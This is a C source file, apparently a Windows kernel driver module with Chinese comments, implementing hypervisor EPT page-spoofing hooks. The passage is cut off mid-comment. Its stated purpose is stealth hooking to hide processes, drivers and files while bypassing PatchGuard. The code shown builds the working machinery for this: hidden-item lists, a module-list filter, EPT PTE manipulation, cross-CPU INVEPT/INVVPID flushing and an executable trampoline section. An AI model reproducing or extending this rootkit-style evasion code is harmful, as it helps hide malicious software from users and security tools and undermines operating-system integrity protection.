/*
 * EptHook.c
 * 
 * EPT Hook 模块实现
 * 
 * 功能：
 *   - 使用 EPT 分页欺骗实现隐身 Hook
 *   - 支持隐藏进程、驱动（绕过 PatchGuard）
 */

#include "EptHook.h"
#include "SimpleHypervisor.h"
#include "HvTypes.h"
#include "HvCompat.h"
#include "HvCore.h"
#include "HvNested.h"
#include "HvLde.h"
#include "HvHook.h"   // 2026-06-18: 反向保护需要 HvHookIsDebuggerPid / IsTrustedSystemCaller
#include "HvPebCloak.h"
#include <ntstrsafe.h>

// P122: 全 driver DbgPrint → GUI ring
#define HV_TRACE_THIS_CAT HV_TRACE_CAT_EPT
#include "HvTrace.h"

#define EPT_DIRECT_CALLBACK_BEGIN(_Handle)                                   \
    HV_HOOK_HANDLE hvDirectCallbackHandle = (HV_HOOK_HANDLE)(_Handle);       \
    if (!HvHookCallbackAcquire(hvDirectCallbackHandle)) {                    \
        return STATUS_DELETE_PENDING;                                        \
    }                                                                        \
    __try {

#define EPT_DIRECT_CALLBACK_END()                                             \
    } __finally {                                                            \
        HvHookCallbackRelease(hvDirectCallbackHandle);                       \
    }

// 汇编函数声明
extern UCHAR AsmInveptAllContexts(VOID);
extern UCHAR AsmInveptSingleContext(ULONG64 Eptp);
extern UCHAR AsmInvvpidAllContexts(VOID);

// ============================================================
// 2026-06-19 方案 C: 静态 trampoline pool 放在 driver image 自定义可执行 section
// ============================================================
//
// 问题: 之前 trampoline pool 用 ExAllocatePool2(NonPagedExecute) 分配在
//       NonPaged pool 区 (0xFFFFA...~0xFFFFC...), 而内核模块 (含 win32kfull.sys)
//       的代码段在 0xFFFFF8... 区。两者距离 > 2 GB。
//       hook win32kfull.sys 函数中含 RIP-relative 指令 (mov r10,[rip+disp32])时,
//       trampoline 复制到远地址后 disp32 重定位溢出, LDE 返回 STATUS_NOT_SUPPORTED。
//
// 修法: 把 trampoline pool 做成 driver image 内嵌的静态可执行数组。
//       driver image 通常也在 0xFFFFF8... 区, 跟 kernel modules 同 PML4 entry,
//       距离 < 2 GB, RIP-relative 重定位不溢出。
//
// section ".HVTRAMP": Read + Execute + Write (链接器 /SECTION:.HVTRAMP,RWE)
//
// 注意: 4 页 (16 KB), 与原来 ExAllocatePool2 分配大小一致, 池容量不变。
//       INT3 (0xCC) 填充作为越界守卫 (跟原方案一致)。
// 注意 #pragma section 的 write 属性会被 warning C4330 忽略, 实际由链接器
// /SECTION:.HVTRAMP,RWE 把整个 section 标 R/W/E。
#pragma section(".HVTRAMP", read, execute)
__declspec(allocate(".HVTRAMP"))
static UCHAR g_StaticTrampolinePool[PAGE_SIZE_4KB * 4] = { 0 };

// ============================================================
// 类型定义
// ============================================================

// KLDR_DATA_TABLE_ENTRY - 内核加载模块链表条目
// KLDR_DATA_TABLE_ENTRY 和 RTL_PROCESS_MODULES 已在 HvTypes.h 中定义
// 使用别名保持兼容性
typedef HV_RTL_PROCESS_MODULE_INFORMATION RTL_PROCESS_MODULE_INFORMATION_EPT;
typedef PHV_RTL_PROCESS_MODULE_INFORMATION PRTL_PROCESS_MODULE_INFORMATION_EPT;
typedef HV_RTL_PROCESS_MODULES RTL_PROCESS_MODULES_EPT;
typedef PHV_RTL_PROCESS_MODULES PRTL_PROCESS_MODULES_EPT;

// 前向声明：文件隐藏相关全局变量
#define MAX_HIDDEN_FILES_EPT 32
#define MAX_FILE_NAME_LEN 256
static WCHAR g_HiddenFileNames[MAX_HIDDEN_FILES_EPT][MAX_FILE_NAME_LEN];
static ULONG g_HiddenFileCount;
static KSPIN_LOCK g_HiddenFileLock;
static volatile LONG g_HiddenFileLockInitialized;

// 前向声明：驱动隐藏相关全局变量
#define MAX_HIDDEN_DRIVERS_EPT 32
#define MAX_DRIVER_NAME_LEN_EPT 128
static WCHAR g_HiddenDriverNames[MAX_HIDDEN_DRIVERS_EPT][MAX_DRIVER_NAME_LEN_EPT];
static WCHAR g_HiddenDriverServiceNames[MAX_HIDDEN_DRIVERS_EPT][MAX_DRIVER_NAME_LEN_EPT];
static PVOID g_HiddenDriverBases[MAX_HIDDEN_DRIVERS_EPT];
static ULONG g_HiddenDriverSizes[MAX_HIDDEN_DRIVERS_EPT];
ULONG g_HiddenDriverCount;  // 2026-06-18: 去 static (HvHook hook 内 fast-path 用)
static KSPIN_LOCK g_HiddenDriverLock;
static volatile LONG g_HiddenDriverLockInitialized;
static VOID EptFilterModuleList(PRTL_PROCESS_MODULES_EPT ModuleInfo);  // 见 5912 行实现, unstatic 在那里

// INVEPT 类型
#define INVEPT_SINGLE_CONTEXT   1
#define INVEPT_ALL_CONTEXT      2

// EPT 页表项结构（用于遍历）
typedef union _EPT_ENTRY {
    ULONG64 Value;
    struct {
        ULONG64 Read : 1;           // 位 0
        ULONG64 Write : 1;          // 位 1
        ULONG64 Execute : 1;        // 位 2
        ULONG64 MemoryType : 3;     // 位 3-5 (仅叶子项)
        ULONG64 IgnorePat : 1;      // 位 6 (仅叶子项)
        ULONG64 LargePage : 1;      // 位 7 (1GB/2MB 大页标志)
        ULONG64 Accessed : 1;       // 位 8
        ULONG64 Dirty : 1;          // 位 9 (仅叶子项)
        ULONG64 ExecuteForUserMode : 1; // 位 10
        ULONG64 Ignored1 : 1;       // 位 11
        ULONG64 PhysicalPageNumber : 40; // 位 12-51
        ULONG64 Ignored2 : 11;      // 位 52-62
        ULONG64 SuppressVe : 1;     // 位 63
    };
} EPT_ENTRY, *PEPT_ENTRY;

// VMCALL 命令定义（与 SimpleHypervisor.c 中一致）
#define VMCALL_EPT_INVEPT       0xEBF00001
#define VMCALL_EPT_RESTORE_HOOK 0xEBF00002  // 恢复 EPT Hook 状态（X=0）
#define VMCALL_INVVPID          0xEBF00003  // 执行 INVVPID（VPID 跨模式刷新）

// 声明 VMCALL 汇编函数
extern VOID AsmVmCall(ULONG64 HypercallNumber);
// INVVPID 全 context 汇编 stub（已在 AsmVmx.asm:637 实现）
extern UCHAR AsmInvvpidAllContexts(VOID);

// 标记是否在 VMX root 模式（由 VM Exit Handler 设置）
// 每个 CPU 独立标志，防止多核竞态
volatile BOOLEAN g_InVmxRootModePerCpu[64] = { FALSE };

// 隐藏进程列表（前向定义，在 EptHookInitialize 之前需要）
#define MAX_HIDDEN_PROCESSES 16
static ULONG g_HiddenProcessIds[MAX_HIDDEN_PROCESSES] = { 0 };
ULONG g_HiddenProcessCount = 0;  // 2026-06-18: 去 static
static KSPIN_LOCK g_HiddenProcessLock;

// ============================================================
// 多 CPU EPT TLB 同步
// ============================================================

// EPT 版本号：每次修改 EPT PTE 时递增
volatile LONG64 g_EptVersion = 0;

// 每个 CPU 上次看到的 EPT 版本号
static volatile LONG64 g_LastEptVersion[64] = { 0 };

/*
 * 增加 EPT 版本号
 * 在修改 PTE 后调用，通知其他 CPU 需要刷新 TLB
 */
static LONG64
EptIncrementVersion(VOID)
{
    return InterlockedIncrement64((volatile LONG64*)&g_EptVersion);
}

/*
 * 检查并刷新 EPT TLB（如果需要）
 * 在每次 VM Exit 开始时调用
 * 确保当前 CPU 看到最新的 EPT 映射
 */
VOID
EptCheckAndInvalidateTlb(_In_ PVCPU_DATA VcpuData)
{
    ULONG cpuIndex;
    LONG64 currentVersion;

    if (!VcpuData || VcpuData->ProcessorNumber >= 64) return;
    cpuIndex = VcpuData->ProcessorNumber;
    
    currentVersion = g_EptVersion;
    
    if (g_LastEptVersion[cpuIndex] != currentVersion) {
        // EPT 已被修改，需要刷新当前 CPU 的 TLB
        UCHAR result = AsmInveptAllContexts();
        if (result == 0) {
            g_LastEptVersion[cpuIndex] = currentVersion;
        }
    }
}

typedef struct _EPT_INVEPT_IPI_CONTEXT {
    LONG64 Generation;
    volatile LONG FailureCount;
} EPT_INVEPT_IPI_CONTEXT, *PEPT_INVEPT_IPI_CONTEXT;

// IPI target: 每个核走 VMCALL 进 root,host 端执行 INVEPT。
// 注意: 这运行在 IPI_LEVEL。VMCALL 是普通 CPU 指令,不依赖任何高 IRQL 受限的 API。
static ULONG_PTR
EptInveptIpiTarget(_In_ ULONG_PTR Context)
{
    PEPT_INVEPT_IPI_CONTEXT invalidate =
        (PEPT_INVEPT_IPI_CONTEXT)Context;
    ULONG cpu = KeGetCurrentProcessorNumber();
    BOOLEAN succeeded = FALSE;

    if (cpu >= 64) cpu = 0;

    if (g_InVmxRootModePerCpu[cpu]) {
        // 已在 root 模式(理论上 IPI 目标不会处于此态,留作保险)
        UCHAR result = AsmInveptAllContexts();
        succeeded = (result == 0);
    } else if (HvIsCurrentProcessorVirtualized()) {
        __try {
            succeeded =
                (AsmVmCallWithResult(VMCALL_EPT_INVEPT) == 0);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            succeeded = FALSE;
        }
    }
    if (invalidate && succeeded) {
        g_LastEptVersion[cpu] = invalidate->Generation;
    } else if (invalidate) {
        InterlockedIncrement(&invalidate->FailureCount);
    }
    return 0;
}

// 执行 INVEPT 指令刷新所有 EPT 上下文
// 此函数会自动检测当前模式并选择正确的执行方式
// 同时增加 EPT 版本号，通知其他 CPU 需要刷新 TLB
//
// 非 static — 其他模块 (如 HvXhciEptTrap.c) 需要在
// PASSIVE_LEVEL 调用此函数完成跨核 EPT 失效。
VOID
EptInveptAllContexts(VOID)
{
    ULONG cpuIndex;
    PVCPU_DATA rootVcpu = HvNestedGetCurrentVcpu();
    LONG64 generation;

    // 先递增版本,保证任何错过 IPI 的核在下次 VM Exit 时通过 EptCheckAndInvalidateTlb 自救。
    generation = EptIncrementVersion();

    // ========================================
    // 2026-05-21 第八轮关键修复:root 模式判定**必须先做**。
    //   KeGetCurrentIrql 在 VMX root mode 下行为未定义/会继承 guest 的 IRQL。
    //   若 guest 当时在 PASSIVE_LEVEL,KeGetCurrentIrql 返回 0 → 错走 path A
    //   → KeIpiGenericCall 等其他 CPU 响应 → 其他 CPU 也在 root 模式无法响应
    //   → 瞬间全核死锁 = 加载 1 秒卡死,无 dump。
    // ========================================
    if (rootVcpu && rootVcpu->ProcessorNumber < 64 &&
        g_InVmxRootModePerCpu[rootVcpu->ProcessorNumber]) {
        UCHAR result = AsmInveptAllContexts();
        if (result == 0) {
            g_LastEptVersion[rootVcpu->ProcessorNumber] = generation;
        }
        return;
    }

    cpuIndex = KeGetCurrentProcessorNumber();
    if (cpuIndex >= 64) cpuIndex = 0;

    KIRQL irql = KeGetCurrentIrql();

    // 路径 A: 调用方在 PASSIVE/APC,可发起 IPI → 全核同步刷新。
    if (irql <= APC_LEVEL && g_HypervisorContext.IsActive) {
        EPT_INVEPT_IPI_CONTEXT invalidate;

        invalidate.Generation = generation;
        invalidate.FailureCount = 0;
        KeIpiGenericCall(
            EptInveptIpiTarget,
            (ULONG_PTR)&invalidate);
        return;
    }

    // 路径 B: 高 IRQL(但非 root 模式) —— 不能广播 IPI。
    //         走 VMCALL 进入 root 后执行 INVEPT。
    if (HvIsCurrentProcessorVirtualized()) {
        BOOLEAN succeeded = FALSE;
        __try {
            succeeded =
                (AsmVmCallWithResult(VMCALL_EPT_INVEPT) == 0);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            succeeded = FALSE;
        }
        if (succeeded) {
            g_LastEptVersion[cpuIndex] = generation;
        }
    }
    // else: hypervisor 未激活,无需 INVEPT。
}

// ============================================================
// VPID 跨模式 TLB 刷新（与 EptInveptAllContexts 同形）
// ============================================================
//
// VPID 启用后(SECONDARY_EXEC_ENABLE_VPID),每个 vCPU 的 TLB 条目用
// VPID 标记。EPT 修改用 INVEPT 即可,但当 Guest CR3/页表本身变化(尤其
// INVLPG/CR3 写)时需要 INVVPID 清掉 linear-translation cache。
//
// 与 EptInveptAllContexts 一致的三路径派发,严格遵循"root 模式判定先于 IRQL"
// 防全核死锁(见 EptInveptAllContexts 的 2026-05-21 第八轮注释)。

// IPI target: 同 EptInveptIpiTarget,但执行 INVVPID
static ULONG_PTR
EptInvvpidIpiTarget(_In_ ULONG_PTR Context)
{
    UNREFERENCED_PARAMETER(Context);
    ULONG cpu = KeGetCurrentProcessorNumber();
    if (cpu >= 64) cpu = 0;

    if (g_InVmxRootModePerCpu[cpu]) {
        UCHAR result = AsmInvvpidAllContexts();
        (void)result;
    } else if (HvIsCurrentProcessorVirtualized()) {
        __try {
            AsmVmCall(VMCALL_INVVPID);
        } __except (EXCEPTION_EXECUTE_HANDLER) { /* IPI 上下文吞掉 */ }
    }
    return 0;
}

// 跨模式刷新所有 VPID 上下文
// 调用规则与 EptInveptAllContexts 完全相同:
//   1) 当前 CPU 已在 VMX root → 直接 INVVPID（合法,无 IRQL 限制）
//   2) PASSIVE/APC + hypervisor active → KeIpiGenericCall 全核广播
//   3) 高 IRQL 非 root + hypervisor active → AsmVmCall(VMCALL_INVVPID) 进入 root
//   4) hypervisor 未激活 → no-op
//
// 注意:VPID 在我们这是 per-vCPU 固定值(=ProcessorNumber+1),所以全 context
// 失效是安全的;细粒度按 VPID 失效需要单独的 stub,这里暂不实现。
VOID
EptInvvpidAllContexts(VOID)
{
    ULONG cpuIndex;
    PVCPU_DATA rootVcpu = HvNestedGetCurrentVcpu();

    // root 判定必须先于 KeGetCurrentIrql（详见 EptInveptAllContexts 注释）
    if (rootVcpu && rootVcpu->ProcessorNumber < 64 &&
        g_InVmxRootModePerCpu[rootVcpu->ProcessorNumber]) {
        UCHAR result = AsmInvvpidAllContexts();
        (void)result;
        return;
    }

    cpuIndex = KeGetCurrentProcessorNumber();
    if (cpuIndex >= 64) cpuIndex = 0;

    KIRQL irql = KeGetCurrentIrql();

    if (irql <= APC_LEVEL && g_HypervisorContext.IsActive) {
        KeIpiGenericCall(EptInvvpidIpiTarget, 0);
        return;
    }

    if (HvIsCurrentProcessorVirtualized()) {
        __try {
            AsmVmCall(VMCALL_INVVPID);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
        }
    }
}

// ============================================================
// EPT PTE 原子写 helper (2026-05-21 第七轮根本修复 - cmpxchg64)
//
// 旧代码逐字段写 PTE("pte->Read=1; pte->Write=1; pte->Execute=1; pte->PA=...")
// 实际是 4 次独立 RMW;多核同时写同 PTE 时另一个 CPU 可能看到部分写状态
// (例如 R=1/W=0/X=0/PA=新值 这种中间态)。这是 NtQuerySystemInformation
// hook 启动期高频死循环的根因之一。
//
// 本 helper 把整个 64-bit PTE 值一次原子写完成,任何 CPU 任何时刻看到的
// PTE 都是完整有效的状态(全旧值或全新值,无半写态)。
//
// MemoryType 强制 WB=6 (NT 内核代码页都是 WB);A/D 位不保留(本设计本来
// 就在频繁切换,这两位不再有 MM 语义)。
//
static __forceinline VOID
EptSetPteAtomic(
    _In_ PEPT_PTE_ENTRY Pte,
    _In_ ULONG64 PhysAddrPfn,
    _In_ ULONG Read,
    _In_ ULONG Write,
    _In_ ULONG Execute)
{
    EPT_PTE_ENTRY newPte;
    newPte.Value = 0;
    newPte.Read = (Read != 0) ? 1ULL : 0ULL;
    newPte.Write = (Write != 0) ? 1ULL : 0ULL;
    newPte.Execute = (Execute != 0) ? 1ULL : 0ULL;
    newPte.MemoryType = HvEptGetMemoryType(
        PhysAddrPfn << PAGE_SHIFT, PAGE_SIZE);
    newPte.PhysicalAddress = PhysAddrPfn & 0xFFFFFFFFFFULL;  // 40 bits
    InterlockedExchange64((volatile LONG64*)&Pte->Value, (LONG64)newPte.Value);
}

/*
 * Final withdrawal must restore the exact leaf that existed before
 * activation.  Reconstructing a nominal identity/RWX entry loses memory
 * type, PAT/VE policy, user-execute policy, A/D state and any deliberately
 * restricted permission bits owned by the base EPT implementation.
 */
#if 0 /* legacy per-site leaf ownership */
static __forceinline BOOLEAN
EptHookpRestoreOriginalLeaf(
    _In_ PEPT_HOOK_ENTRY HookEntry,
    _In_ ULONG CpuIndex)
{
    if (!HookEntry ||
        CpuIndex >= HookEntry->TargetPteCount ||
        CpuIndex >= RTL_NUMBER_OF(HookEntry->TargetPte) ||
        !HookEntry->TargetPte[CpuIndex]) {
        return FALSE;
    }

    InterlockedExchange64(
        (volatile LONG64*)&HookEntry->TargetPte[CpuIndex]->Value,
        (LONG64)HookEntry->OriginalPteValue[CpuIndex]);
    return TRUE;
}

static ULONG
EptHookpRestoreOriginalLeaves(
    _In_ PEPT_HOOK_ENTRY HookEntry)
{
    ULONG restoredCount = 0;
    ULONG cpuIndex;

    if (!HookEntry) {
        return 0;
    }

    for (cpuIndex = 0;
         cpuIndex < HookEntry->TargetPteCount &&
         cpuIndex < RTL_NUMBER_OF(HookEntry->TargetPte);
         ++cpuIndex) {
        if (EptHookpRestoreOriginalLeaf(HookEntry, cpuIndex)) {
            ++restoredCount;
        }
    }
    return restoredCount;
}
#endif

static __forceinline PEPT_PTE_ENTRY
EptHookpSelectPagePte(
    _In_ PEPT_HOOK_PAGE Page,
    _In_opt_ PVCPU_DATA VcpuData,
    _In_ ULONG CpuIndex)
{
    if (!Page || CpuIndex >= RTL_NUMBER_OF(Page->TargetPte)) {
        return NULL;
    }
    if (VcpuData && VcpuData->ActiveEptpIsPebSpoof) {
        if (Page->OverlaySiteCount == 0) return NULL;
        return Page->OverlayTargetPte[CpuIndex];
    }
    return Page->TargetPte[CpuIndex];
}

static __forceinline ULONG64
EptHookpSelectPageOriginalPteValue(
    _In_ PEPT_HOOK_PAGE Page,
    _In_opt_ PVCPU_DATA VcpuData,
    _In_ ULONG CpuIndex)
{
    if (VcpuData && VcpuData->ActiveEptpIsPebSpoof) {
        return Page->OverlayOriginalPteValue[CpuIndex];
    }
    return Page->OriginalPteValue[CpuIndex];
}

static __forceinline BOOLEAN
EptHookpRestorePageOriginalLeaf(
    _In_ PEPT_HOOK_PAGE Page,
    _In_ ULONG CpuIndex)
{
    if (!Page ||
        CpuIndex >= Page->TargetPteCount ||
        CpuIndex >= RTL_NUMBER_OF(Page->TargetPte) ||
        !Page->TargetPte[CpuIndex]) {
        return FALSE;
    }

    InterlockedExchange64(
        (volatile LONG64*)&Page->TargetPte[CpuIndex]->Value,
        (LONG64)Page->OriginalPteValue[CpuIndex]);
    return TRUE;
}

static __forceinline BOOLEAN
EptHookpRestorePageOriginalLeafForVcpu(
    _In_ PEPT_HOOK_PAGE Page,
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG CpuIndex)
{
    PEPT_PTE_ENTRY pte = EptHookpSelectPagePte(
        Page, VcpuData, CpuIndex);
    if (!pte) return FALSE;

    InterlockedExchange64(
        (volatile LONG64*)&pte->Value,
        (LONG64)EptHookpSelectPageOriginalPteValue(
            Page, VcpuData, CpuIndex));
    return TRUE;
}

static ULONG
EptHookpRestorePageOriginalLeaves(_In_ PEPT_HOOK_PAGE Page)
{
    ULONG restoredCount = 0;
    ULONG cpuIndex;

    if (!Page) {
        return 0;
    }
    for (cpuIndex = 0;
         cpuIndex < Page->TargetPteCount &&
         cpuIndex < RTL_NUMBER_OF(Page->TargetPte);
         ++cpuIndex) {
        if (EptHookpRestorePageOriginalLeaf(Page, cpuIndex)) {
            ++restoredCount;
        }
    }
    HvOverlayEptAcquireMutation();
    for (cpuIndex = 0;
         cpuIndex < Page->OverlayTargetPteCount &&
         cpuIndex < RTL_NUMBER_OF(Page->OverlayTargetPte);
         ++cpuIndex) {
        if (!Page->OverlayTargetPte[cpuIndex]) continue;
        InterlockedExchange64(
            (volatile LONG64*)&Page->OverlayTargetPte[cpuIndex]->Value,
            (LONG64)Page->OverlayOriginalPteValue[cpuIndex]);
        ++restoredCount;
    }
    HvOverlayEptReleaseMutation();
    return restoredCount;
}

// 同上,但保留当前 PFN 不变,只把 R/W/X 一次原子置 1。
// 用于 Round 6 MTF-active 路径:不知道当前 PFN 是 FakePage 还是 OriginalPage,
// 不能盲目覆盖。用 cmpxchg64 read-modify-write 确保 PFN 字段不被破坏。
//
static __forceinline VOID
EptOpenRwxKeepPfnAtomic(
    _In_ PEPT_PTE_ENTRY Pte)
{
    LONG64 oldVal, newVal;
    EPT_PTE_ENTRY tmp;
    for (;;) {
        oldVal = *(volatile LONG64*)&Pte->Value;
        tmp.Value = (ULONG64)oldVal;
        tmp.Read = 1;
        tmp.Write = 1;
        tmp.Execute = 1;
        newVal = (LONG64)tmp.Value;
        if (newVal == oldVal) {
            break;  // 已经是 RWX,无需写
        }
        if (InterlockedCompareExchange64(
                (volatile LONG64*)&Pte->Value, newVal, oldVal) == oldVal) {
            break;
        }
        // cmpxchg 失败 → 另一个 CPU 刚改过,重试
    }
}

// 设置 VMX root 模式标志（由 VM Exit Handler 调用）
VOID EptSetVmxRootMode(
    _In_ PVCPU_DATA VcpuData,
    _In_ BOOLEAN InRootMode)
{
    if (VcpuData && VcpuData->ProcessorNumber < 64) {
        g_InVmxRootModePerCpu[VcpuData->ProcessorNumber] = InRootMode;
    }
}

// ============================================================
// 全局变量
// ============================================================

EPT_HOOK_MANAGER g_EptHookManager = { 0 };

#define EPT_HOOK_ROOT_EPOCHS          2
#define EPT_HOOK_ROOT_ACQUIRE_RETRIES 8
#define EPT_HOOK_DRAIN_RETRIES        200
#define EPT_PAGE_MUTATION_NONE         0
#define EPT_PAGE_MUTATION_ACTIVATE     1
#define EPT_PAGE_MUTATION_REMOVE       2
#define EPT_HOOK_MTF_IDLE               0
#define EPT_HOOK_MTF_PUBLISHING         1
#define EPT_HOOK_MTF_ARMED              2
#define EPT_HOOK_MTF_COMPLETING         3

static BOOLEAN
EptHookpAcquireRootEpoch(_Out_ PULONG Epoch)
{
    ULONG retry;

    for (retry = 0; retry < EPT_HOOK_ROOT_ACQUIRE_RETRIES; ++retry) {
        LONG epoch = InterlockedCompareExchange(
            &g_EptHookManager.RootEpoch, 0, 0) & 1;
        InterlockedIncrement(&g_EptHookManager.RootReaders[epoch]);
        MemoryBarrier();
        if (epoch == (InterlockedCompareExchange(
                &g_EptHookManager.RootEpoch, 0, 0) & 1)) {
            *Epoch = (ULONG)epoch;
            return TRUE;
        }
        InterlockedDecrement(&g_EptHookManager.RootReaders[epoch]);
        YieldProcessor();
    }
    return FALSE;
}

static __forceinline VOID
EptHookpReleaseRootEpoch(_In_ ULONG Epoch)
{
    InterlockedDecrement(
        &g_EptHookManager.RootReaders[Epoch & 1]);
}

static ULONG
EptHookpAdvanceRootEpoch(VOID)
{
    LONG oldEpoch;
    LONG newEpoch;

    do {
        oldEpoch = InterlockedCompareExchange(
            &g_EptHookManager.RootEpoch, 0, 0) & 1;
        newEpoch = oldEpoch ^ 1;
    } while (InterlockedCompareExchange(
                 &g_EptHookManager.RootEpoch,
                 newEpoch,
                 oldEpoch) != oldEpoch);
    MemoryBarrier();
    return (ULONG)oldEpoch;
}

static BOOLEAN
EptHookpWaitRootEpoch(_In_ ULONG Epoch)
{
    ULONG retry;

    for (retry = 0; retry < EPT_HOOK_DRAIN_RETRIES; ++retry) {
        if (InterlockedCompareExchange(
                &g_EptHookManager.RootReaders[Epoch & 1], 0, 0) == 0) {
            return TRUE;
        }
        if (KeGetCurrentIrql() <= APC_LEVEL) {
            LARGE_INTEGER delay;
            delay.QuadPart = -10000;
            KeDelayExecutionThread(KernelMode, FALSE, &delay);
        } else {
            KeStallExecutionProcessor(50);
        }
    }
    return FALSE;
}

// x64 跳转指令模板 (jmp [rip+0])
static const UCHAR JmpTemplate[] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,  // jmp qword ptr [rip+0]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // 地址占位符
};
#define JMP_SIZE EPT_HOOK_PATCH_SIZE

// ============================================================
// 简化的 x64 指令长度解码器 (LDE)
// 2026-06-16 方案 A: 整个原 fork 解码器删除, 改调共享 HvLde.c::HvLdeDecode。
// 保留 GetInstructionLength 同名 wrapper 以减少 CalculateTrampolineSize 等调用点 churn。
// ============================================================

/*
 * 获取单条 x64 指令的长度 — 共享解码器 wrapper。
 *
 * @param Code  指向指令的指针
 * @return 指令长度，0 表示无法解码
 */
static ULONG
GetInstructionLength(
    _In_ PUCHAR Code
)
{
    HV_INST_INFO info;
    if (!HvLdeDecode(Code, &info)) return 0;
    return info.Length;
}

/*
 * 计算需要复制的最小字节数以包含完整指令
 * 
 * @param Code       指向代码的指针
 * @param MinBytes   至少需要覆盖的字节数
 * @return 实际应该复制的字节数
 */
static ULONG
CalculateTrampolineSize(
    _In_ PUCHAR Code,
    _In_ ULONG MinBytes
)
{
    ULONG totalLength = 0;
    ULONG instLength;
    ULONG maxInstructions = 10;  // 安全限制
    
    while (totalLength < MinBytes && maxInstructions > 0) {
        instLength = GetInstructionLength(Code + totalLength);
        
        if (instLength == 0) {
            // 无法解码 —— 返回 0 通知调用方拒装,绝不强写 JMP_SIZE 字节覆盖到指令中间。
            DbgPrint("[EPT-Hook] Failed to decode instruction at offset %d\n", totalLength);
            return 0;
        }
        
        totalLength += instLength;
        maxInstructions--;
    }
    
    DbgPrint("[EPT-Hook] Trampoline size calculated: %d bytes (min was %d)\n", totalLength, MinBytes);
    
    return totalLength;
}

// ============================================================
// 内部函数声明
// ============================================================

PEPT_PTE_ENTRY
EptGetPteForPhysicalAddress(
    _In_ ULONG64 PhysicalAddress
);

static PVOID
EptMapPhysicalToVirtual(
    _In_ ULONG64 PhysicalAddress
);

// P1-3: per-CPU PTE 安装 - 每核独立 split 2MB → 自己的 PT
static BOOLEAN
EptSetupPerCpuPtesForHook(
    _In_ ULONG64 PhysicalAddress,
    _Inout_ PEPT_HOOK_ENTRY HookEntry
);

static BOOLEAN
EptSetupPerCpuOverlayPtesForPage(
    _In_ ULONG64 PhysicalAddress,
    _Inout_ PEPT_HOOK_PAGE Page
);

static NTSTATUS
EptCreateFakePage(
    _In_ PEPT_HOOK_ENTRY HookEntry
);

static NTSTATUS
EptCreateTrampoline(
    _In_ PEPT_HOOK_ENTRY HookEntry
);

static VOID
EptSwitchToFakePage(
    _In_ PVCPU_DATA VcpuData,
    _In_ PEPT_HOOK_PAGE Page,
    _In_ ULONG CpuIndex
);

static VOID
EptSwitchToOriginalPage(
    _In_ PVCPU_DATA VcpuData,
    _In_ PEPT_HOOK_PAGE Page,
    _In_ ULONG CpuIndex
);

static PEPT_HOOK_PAGE
EptHookFindPageByPhysicalAddressNoLock(
    _In_ ULONG64 PhysicalAddress
);

static NTSTATUS
EptHookpRemoveClaimed(_In_ PEPT_HOOK_ENTRY HookEntry);

// ============================================================
// EPT 结构检测和信息打印
// ============================================================

/*
 * 打印当前 EPT 结构信息
 * 用于调试和验证 EPT 配置
 * 
 * 注意：此函数不使用 __vmx_vmread，因为可能在 VMX 模式外调用
 */
VOID
EptPrintInfo(VOID)
{
    DbgPrint("[EPT-Hook] ========== EPT Structure Info ==========\n");
    
    // 检查 Hypervisor 状态
    if (!g_HypervisorContext.IsActive) {
        DbgPrint("[EPT-Hook] Hypervisor is not active\n");
        DbgPrint("[EPT-Hook] =====================================\n");
        return;
    }
    
    // 注意：不能使用 __vmx_vmread，因为 VMLAUNCH 返回后不再处于 VMX root 模式
    // 只从 VcpuData 结构中读取 EPT 信息
    
    // 检查 VcpuData 中的 EPT 表
    if (g_HypervisorContext.VcpuData) {
        ULONG cpuIndex = KeGetCurrentProcessorNumber();
        PVCPU_DATA vcpuData = &g_HypervisorContext.VcpuData[cpuIndex];
        
        DbgPrint("[EPT-Hook] CPU %d VcpuData:\n", cpuIndex);
        
        if (vcpuData->EptTables) {
            PEPT_TABLES eptTables = vcpuData->EptTables;
            ULONG64 pml4Pa = eptTables->Pml4Physical.QuadPart;
            ULONG validPml4Count = 0;
            ULONG validPdptCount = 0;
            ULONG i;
            
            // 统计有效条目
            for (i = 0; i < 512; i++) {
                if (eptTables->Pml4[i].Read || eptTables->Pml4[i].Write || 
                    eptTables->Pml4[i].Execute) {
                    validPml4Count++;
                }
                if (eptTables->Pdpt[i].Read || eptTables->Pdpt[i].Write || 
                    eptTables->Pdpt[i].Execute) {
                    validPdptCount++;
                }
            }
            
            DbgPrint("[EPT-Hook]   EptTables VA: %p\n", eptTables);
            DbgPrint("[EPT-Hook]   PML4 Physical: 0x%llx\n", pml4Pa);
            DbgPrint("[EPT-Hook]   Valid PML4 entries: %d\n", validPml4Count);
            DbgPrint("[EPT-Hook]   Valid PDPT entries: %d\n", validPdptCount);
            
            // 打印前几个有效的 PML4 条目
            for (i = 0; i < 4 && i < 512; i++) {
                if (eptTables->Pml4[i].Read || eptTables->Pml4[i].Write || 
                    eptTables->Pml4[i].Execute) {
                    DbgPrint("[EPT-Hook]   PML4[%d]: 0x%llx (R=%d W=%d X=%d PFN=0x%llx)\n",
                        i, eptTables->Pml4[i].Value,
                        eptTables->Pml4[i].Read,
                        eptTables->Pml4[i].Write,
                        eptTables->Pml4[i].Execute,
                        eptTables->Pml4[i].PageFrameNumber);
                }
            }
        } else {
            DbgPrint("[EPT-Hook]   EptTables: NULL (EPT not configured)\n");
        }
    }
    
    DbgPrint("[EPT-Hook] =====================================\n");
}

/*
 * 检查 EPT 是否正确配置
 * 
 * 注意：此函数不使用 __vmx_vmread，因为可能在 VMX 模式外调用
 */
BOOLEAN
EptIsConfigured(VOID)
{
    // 检查 Hypervisor 状态
    if (!g_HypervisorContext.IsActive) {
        return FALSE;
    }
    
    // 检查 VcpuData 中的 EPT 表
    if (g_HypervisorContext.VcpuData) {
        ULONG cpuIndex = KeGetCurrentProcessorNumber();
        PVCPU_DATA vcpuData = &g_HypervisorContext.VcpuData[cpuIndex];
        
        if (vcpuData->EptTables) {
            return TRUE;
        }
    }
    
    return FALSE;
}

// ============================================================
// 初始化和清理
// ============================================================

/*
 * 检查 CPU 是否支持 Execute-Only EPT 页面
 * 
 * Execute-Only EPT 允许设置 R=0, W=0, X=1
 * 这是实现隐蔽 Hook 的关键特性（绕过 PatchGuard）
 * 
 * 检测方法（按优先级）：
 * 1. 如果 Hypervisor 已激活，直接根据 CPU 型号判断
